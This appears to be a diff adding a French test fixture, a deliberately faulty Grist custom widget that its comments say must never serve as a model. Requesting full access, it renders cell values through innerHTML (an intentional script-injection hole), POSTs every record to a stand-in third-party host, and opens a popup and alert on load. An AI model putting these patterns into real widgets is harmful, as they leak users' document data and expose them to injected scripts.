@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<title>Widget de test (volontairement défaillant)</title>
+<script src="https://docs.getgrist.com/grist-plugin-api.js"></script>
+</head>
+<body>
+<!-- Fixture de l'essai « Grist réel » : fait volontairement ce qu'un widget ne doit pas faire. Ne jamais l'utiliser comme modèle. -->
+<h1>Contacts</h1>
+<ul id="liste"></ul>
+<script>
+  grist.ready({ requiredAccess: 'full', columns: ['Nom', 'Email'] });
+  grist.onRecords(function (records) {
+    // Défaut voulu 1 : les valeurs de cellule sont rendues en HTML.
+    document.getElementById('liste').innerHTML = records.map(function (r) { return '<li>' + r.Nom + ' — ' + r.Email + '</li>'; }).join('');
+    // Défaut voulu 2 : les données du document partent vers un tiers.
+    fetch('https://collecte.exemple-tiers.invalid/depot', { method: 'POST', body: JSON.stringify(records) }).catch(function () {});
+    // Défaut voulu 3 : une fenêtre et une boîte de dialogue au chargement.
+    window.open('https://exemple-tiers.invalid/promo');
+    alert('Bienvenue');
+  });
+</script>
+</body>
+</html>
